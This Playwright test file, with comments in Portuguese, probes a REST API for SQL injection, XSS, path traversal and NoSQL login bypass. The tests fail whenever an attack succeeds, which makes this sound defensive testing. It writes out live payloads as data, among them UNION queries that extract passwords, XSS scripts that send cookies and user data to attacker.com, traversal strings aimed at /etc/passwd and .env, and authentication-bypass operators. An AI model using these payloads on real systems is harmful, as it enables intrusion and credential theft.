import { test, expect } from '@playwright/test';
import { ApiClient } from '../client/ApiClient';
import { adminUser, regularUser } from '../fixtures/auth.fixture';

test.describe('Testes de Injeção - CT-SEC', () => {
  let apiClient: ApiClient;
  let adminClient: ApiClient;

  test.beforeAll(async () => {
    apiClient = new ApiClient();
    adminClient = new ApiClient();
    await adminClient.login(adminUser);
  });

  test('CT-SEC-01: SQL Injection em busca de produtos', async () => {
    // Primeiro, obtenho um produto legítimo para comparar
    const legitResponse = await adminClient.get('/produtos?nome=computador');
    expect(legitResponse.status()).toBe(200);
    const legitData = await legitResponse.json();
    const legitCount = Array.isArray(legitData) ? legitData.length : 0;

    // Payloads que tentam modificar a query para retornar MAIS dados que o normal
    const sqlPayloads = [
      {
        name: 'OR sempre verdadeiro',
        payload: "' OR '1'='1' -- ",
        // Se a API for vulnerável, deve retornar MAIS produtos que a busca legítima
        shouldReturnMore: true
      },
      {
        name: 'UNION para extrair dados de outra tabela',
        payload: "' UNION SELECT nome, email, senha FROM usuarios -- ",
        // Se vulnerável, deve retornar dados que não são produtos (ex: emails)
        shouldReturnNonProductData: true
      },
      {
        name: 'Comentário para ignorar cláusulas',
        payload: "nome' AND '1'='1' -- ",
        shouldReturnMore: true
      },
      {
        name: 'Payload com OR 1=1',
        payload: "nome' OR 1=1 -- ",
        shouldReturnMore: true
      }
    ];

    for (const sql of sqlPayloads) {
      const response = await adminClient.get(`/produtos?nome=${encodeURIComponent(sql.payload)}`);
      
      // Se a API retornar erro, já é um bom sinal (não é vulnerável)
      if (response.status() >= 400) {
        continue;
      }

      const body = await response.json();
      
      if (!Array.isArray(body)) {
        continue;
      }

      // Se retornou MAIS resultados que a busca legítima, é um forte indício de SQL Injection
      if (sql.shouldReturnMore && body.length > legitCount) {
        // Isso é uma vulnerabilidade real - estamos conseguindo contornar o filtro
        console.log(`ALERTA: SQL Injection detectada com payload: ${sql.payload}`);
        console.log(`Resultados: ${body.length} vs ${legitCount} esperados`);
        // Marca como falha porque a API deveria bloquear isso
        expect(body.length).toBeLessThanOrEqual(legitCount + 5);
      }

      // Se o retorno contém campos que não são de produto, é outro indício forte
      if (sql.shouldReturnNonProductData && body.length > 0) {
        const firstItem = body[0];
        // Verifica se retornou campos que não existem em produtos (ex: senha, email)
        if (firstItem && (firstItem.senha || firstItem.email || firstItem.password)) {
          console.log(`ALERTA: UNION SQL Injection detectada - dados sensíveis extraídos`);
          console.log(`Campos retornados: ${Object.keys(firstItem).join(', ')}`);
          expect(firstItem).not.toHaveProperty('senha');
          expect(firstItem).not.toHaveProperty('password');
          expect(firstItem).not.toHaveProperty('email');
        }
      }
    }
  });

  test('CT-SEC-02: XSS em cadastro de usuário', async () => {
    // Payloads que tentam executar código no navegador
    const xssPayloads = [
      {
        name: 'Script tag com fetch para exfiltração',
        payload: `<script>fetch('/usuarios').then(r=>r.json()).then(d=>fetch('https://attacker.com/steal', {method:'POST',body:JSON.stringify(d)}))</script>`
      },
      {
        name: 'Image onerror com exfiltração de cookies',
        payload: `<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`
      },
      {
        name: 'SVG com script',
        payload: `<svg><script>alert(document.domain)</script></svg>`
      },
      {
        name: 'Iframe com redirect',
        payload: `<iframe src="javascript:alert('XSS')">`
      },
      {
        name: 'Event handler em body',
        payload: `<body onload="alert('XSS')">`
      },
      {
        name: 'Payload com encoding duplo',
        payload: `%3Cscript%3Ealert('XSS')%3C/script%3E`
      },
      {
        name: 'Payload em campo de nome com caracteres especiais',
        payload: `João<script>alert('XSS')</script>`
      },
      {
        name: 'Payload com quebra de atributo',
        payload: `" onmouseover="alert('XSS')"`
      }
    ];

    for (const xss of xssPayloads) {
      const userData = {
        nome: xss.payload,
        email: `xss_${Date.now()}_${Math.random().toString(36).substring(7)}@test.com`,
        password: '123456',
        administrador: 'false'
      };

      const response = await adminClient.post('/usuarios', userData);
      
      // Se a API rejeitar o cadastro, já é um bom sinal
      if (response.status() >= 400) {
        continue;
      }

      const body = await response.json();
      
      if (!body._id) {
        continue;
      }

      // Recupera o usuário cadastrado para ver se o payload foi armazenado como texto puro
      const getResponse = await adminClient.get(`/usuarios/${body._id}`);
      const userBody = await getResponse.json();

      // Verifica se o payload foi sanitizado (escapado) ou removido
      const nome = userBody.nome || '';
      
      // Verifica se não há tags HTML ou atributos de evento
      const hasHtmlTag = /<[^>]*>/.test(nome);
      const hasEventHandler = /on\w+\s*=|javascript:/i.test(nome);
      
      if (hasHtmlTag || hasEventHandler) {
        console.log(`ALERTA: XSS detectado - payload não sanitizado: ${xss.payload}`);
        console.log(`Valor armazenado: ${nome}`);
        // Isso é uma vulnerabilidade - deveria ter escapado ou removido
        expect(hasHtmlTag).toBe(false);
        expect(hasEventHandler).toBe(false);
      }

      // Limpeza
      await adminClient.delete(`/usuarios/${body._id}`);
    }
  });

  test('CT-SEC-03: Path Traversal em download de arquivos', async () => {
    // A API ServeRest pode não ter endpoint de download, mas testamos via busca
    // Tentamos acessar arquivos sensíveis via parâmetros
    const pathPayloads = [
      {
        name: 'Acesso ao /etc/passwd',
        payload: '../../../etc/passwd',
        expectedSensitive: ['root:', 'bin:', 'daemon:']
      },
      {
        name: 'Acesso ao .env',
        payload: '../../../.env',
        expectedSensitive: ['DATABASE_', 'SECRET_', 'API_']
      },
      {
        name: 'Acesso ao package.json',
        payload: '../../../package.json',
        expectedSensitive: ['dependencies', 'scripts', 'name']
      },
      {
        name: 'Acesso a arquivo de configuração',
        payload: '../../../config/database.json',
        expectedSensitive: ['host', 'port', 'username']
      },
      {
        name: 'Path traversal com encoding',
        payload: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
        expectedSensitive: ['root:', 'bin:', 'daemon:']
      },
      {
        name: 'Path traversal em Windows',
        payload: '..\\..\\..\\windows\\win.ini',
        expectedSensitive: ['; for 16-bit app support']
      },
      {
        name: 'Tentativa de acessar código fonte',
        payload: '../../server.js',
        expectedSensitive: ['require(', 'express', 'app.get']
      }
    ];

    for (const path of pathPayloads) {
      // Tenta usar o payload em diferentes parâmetros
      const endpoints = [
        `/produtos?nome=${encodeURIComponent(path.payload)}`,
        `/usuarios?email=${encodeURIComponent(path.payload)}`,
        `/carrinhos?produtoId=${encodeURIComponent(path.payload)}`
      ];

      for (const endpoint of endpoints) {
        const response = await adminClient.get(endpoint);
        
        if (response.status() >= 400) {
          continue;
        }

        const body = await response.text();
        
        // Se o corpo da resposta contém conteúdo sensível de arquivos, é uma vulnerabilidade
        for (const sensitive of path.expectedSensitive) {
          if (body.includes(sensitive)) {
            console.log(`ALERTA: Path Traversal detectado em ${endpoint}`);
            console.log(`Payload: ${path.payload}`);
            console.log(`Conteúdo sensível encontrado: ${sensitive}`);
            console.log(`Primeiros 200 caracteres: ${body.substring(0, 200)}`);
            
            // Isso é uma vulnerabilidade grave
            expect(body).not.toContain(sensitive);
          }
        }
      }
    }
  });

  test('CT-SEC-10: NoSQL Injection no login', async () => {
    // Primeiro, crio um usuário legítimo para testar
    const legitEmail = `test_${Date.now()}@test.com`;
    const legitPassword = 'senha123';
    
    await adminClient.post('/usuarios', {
      nome: 'Usuario Teste',
      email: legitEmail,
      password: legitPassword,
      administrador: 'false'
    });

    // Payloads NoSQL que tentam contornar autenticação
    const noSqlPayloads = [
      {
        name: '$ne null em ambos campos',
        payload: { email: { '$ne': null }, password: { '$ne': null } },
        shouldBypass: true
      },
      {
        name: '$gt vazio',
        payload: { email: { '$gt': '' }, password: { '$gt': '' } },
        shouldBypass: true
      },
      {
        name: '$regex para capturar qualquer email',
        payload: { email: { '$regex': '.*' }, password: { '$regex': '.*' } },
        shouldBypass: true
      },
      {
        name: '$ne para admin específico',
        payload: { email: { '$ne': 'admin@email.com' }, password: '123456' },
        shouldBypass: false
      },
      {
        name: '$in com lista de emails',
        payload: { email: { '$in': ['admin@email.com', legitEmail] }, password: legitPassword },
        shouldBypass: true
      },
      {
        name: '$or para combinar condições',
        payload: { '$or': [{ 'email': legitEmail }, { 'email': { '$ne': null } }], 'password': legitPassword },
        shouldBypass: true
      },
      {
        name: '$not para negar condição',
        payload: { email: { '$not': { '$ne': null } }, password: 'qualquercoisa' },
        shouldBypass: false
      },
      {
        name: 'Payload com $where (se suportado)',
        payload: { email: { '$where': 'this.email == "admin@email.com"' }, password: '123456' },
        shouldBypass: false
      }
    ];

    for (const noSql of noSqlPayloads) {
      const response = await adminClient.post('/login', noSql.payload);
      
      // Se retornou 200, alguém conseguiu logar
      if (response.status() === 200) {
        const body = await response.json();
        
        if (body.authorization) {
          // Verifica se o token gerado é válido
          const token = body.authorization;
          const testClient = new ApiClient();
          testClient.setToken(token);
          
          // Tenta acessar um endpoint protegido com o token obtido
          const protectedResponse = await testClient.get('/produtos');
          
          if (protectedResponse.status() === 200) {
            console.log(`ALERTA CRÍTICO: NoSQL Injection bem-sucedida com payload: ${noSql.name}`);
            console.log(`Payload: ${JSON.stringify(noSql.payload)}`);
            console.log(`Token obtido: ${token.substring(0, 20)}...`);
            
            // Se o payload deveria ter bypassado e conseguiu autenticar, é vulnerável
            if (noSql.shouldBypass) {
              expect(response.status()).toBe(401);
            }
          }
        }
      }
    }

    // Limpeza
    await adminClient.delete(`/usuarios?email=${encodeURIComponent(legitEmail)}`);
  });
});
